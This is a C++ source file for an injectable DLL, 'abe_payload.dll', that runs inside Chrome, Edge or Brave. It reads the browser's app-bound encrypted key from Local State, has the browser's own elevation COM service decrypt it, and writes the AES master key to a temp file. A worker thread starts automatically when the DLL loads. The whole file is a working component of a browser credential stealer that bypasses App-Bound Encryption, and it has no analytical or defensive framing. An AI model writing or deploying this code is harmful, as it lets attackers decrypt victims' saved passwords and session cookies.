// ---------------------------------------------------------------------------
// abe_payload.dll
// Runs inside the browser process (chrome.exe / msedge.exe / brave.exe).
// Reads Local State -> app_bound_encrypted_key -> IElevator::DecryptData
// -> writes the 32-byte AES key to %TEMP%\abe_key.bin
// ---------------------------------------------------------------------------
#include "abe_util.h"
#include <objbase.h>
#include <oleauto.h>
#include <shlobj.h>

// ---------------------------------------------------------------------------
// Browser config
// ---------------------------------------------------------------------------
struct BrowserCfg {
    CLSID clsid;
    IID   iid1;   // IElevator (legacy)
    IID   iid2;   // IElevator2 (preferred, Chrome 144+)
    int   decryptIndex; // vtable index of DecryptData (after IUnknown)
    std::wstring localState;
};

static bool BuildConfig(BrowserCfg& cfg) {
    wchar_t self[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, self, MAX_PATH);
    std::wstring exe(self);
    for (auto& c : exe) c = towlower(c);

    wchar_t appData[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData)))
        return false;

    if (exe.find(L"msedge.exe") != std::wstring::npos) {
        cfg.clsid = CLSID{0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}};
        cfg.iid1  = IID{0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
        cfg.iid2  = IID{0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}};
        cfg.decryptIndex = 8; // IUnknown(3) + IElevatorEdgeBase(3) + Run/Encrypt/Decrypt
        cfg.localState = std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Local State";
        return true;
    }

    if (exe.find(L"brave.exe") != std::wstring::npos) {
        cfg.clsid = CLSID{0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}};
        cfg.iid1  = IID{0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}};
        cfg.iid2  = IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};
        cfg.decryptIndex = 5;
        cfg.localState = std::wstring(appData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
        return true;
    }

    // Default: Chrome
    cfg.clsid = CLSID{0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
    cfg.iid1  = IID{0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
    cfg.iid2  = IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};
    cfg.decryptIndex = 5;
    cfg.localState = std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Local State";
    return true;
}

// ---------------------------------------------------------------------------
// Unwrap
// ---------------------------------------------------------------------------
static bool UnwrapAbeKey(const BrowserCfg& cfg, const std::vector<BYTE>& appBoundBlob,
                         std::vector<BYTE>& keyOut) {
    HRESULT hrInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool comInit = SUCCEEDED(hrInit);
    (void)hrInit; // RPC_E_CHANGED_MODE: COM already initialized by the host

    void* p = NULL;
    HRESULT hr = CoCreateInstance(cfg.clsid, NULL, CLSCTX_LOCAL_SERVER, cfg.iid2, &p);
    if (FAILED(hr) || !p) {
        p = NULL;
        hr = CoCreateInstance(cfg.clsid, NULL, CLSCTX_LOCAL_SERVER, cfg.iid1, &p);
    }
    if (FAILED(hr) || !p) {
        if (comInit) CoUninitialize();
        return false;
    }

    CoSetProxyBlanket((IUnknown*)p, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                      COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                      RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

    BSTR in  = SysAllocStringByteLen((const char*)appBoundBlob.data(), (UINT)appBoundBlob.size());
    BSTR out = nullptr;
    DWORD lastError = 0;

    void** vtable = *(void***)p;
    typedef HRESULT (STDMETHODCALLTYPE *DecryptFn)(void*, const BSTR, BSTR*, DWORD*);
    DecryptFn decrypt = (DecryptFn)vtable[cfg.decryptIndex];

    hr = decrypt(p, in, &out, &lastError);
    SysFreeString(in);

    bool ok = false;
    if (SUCCEEDED(hr) && out) {
        UINT len = SysStringByteLen(out);
        if (len >= 16 && len <= 64) {
            keyOut.assign((BYTE*)out, (BYTE*)out + len);
            ok = true;
        }
        SysFreeString(out);
    }

    ((IUnknown*)p)->Release();
    if (comInit) CoUninitialize();
    return ok;
}

// ---------------------------------------------------------------------------
// Worker
// ---------------------------------------------------------------------------
static DWORD WINAPI Worker(LPVOID) {
    BrowserCfg cfg{};
    std::wstring errPath = TempPath(L"abe_key_err.txt");
    std::wstring keyPath = TempPath(L"abe_key.bin");

    if (!BuildConfig(cfg)) {
        const char* e = "BuildConfig failed";
        WriteFileAll(errPath, e, strlen(e));
        return 1;
    }

    std::string json;
    if (!ReadFileText(cfg.localState, json)) {
        std::string e = "ReadFileText failed: " + W2U8(cfg.localState);
        WriteFileAll(errPath, e.data(), e.size());
        return 2;
    }

    std::string b64;
    if (!ExtractJsonString(json, "app_bound_encrypted_key", b64)) {
        const char* e = "app_bound_encrypted_key not found (ABE unsupported / non-default user-data-dir?)";
        WriteFileAll(errPath, e, strlen(e));
        return 3;
    }

    std::vector<BYTE> blob = Base64Decode(b64);
    if (blob.size() < 8 || memcmp(blob.data(), "APPB", 4) != 0) {
        const char* e = "APPB prefix missing / blob too short";
        WriteFileAll(errPath, e, strlen(e));
        return 4;
    }
    blob.erase(blob.begin(), blob.begin() + 4);

    std::vector<BYTE> key;
    if (!UnwrapAbeKey(cfg, blob, key)) {
        const char* e = "IElevator::DecryptData failed (caller path validation?)";
        WriteFileAll(errPath, e, strlen(e));
        return 5;
    }

    if (!WriteFileAll(keyPath, key.data(), key.size())) {
        const char* e = "WriteFileAll(key) failed";
        WriteFileAll(errPath, e, strlen(e));
        return 6;
    }

    DeleteFileW(errPath.c_str());
    return 0;
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE h = CreateThread(NULL, 0, Worker, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
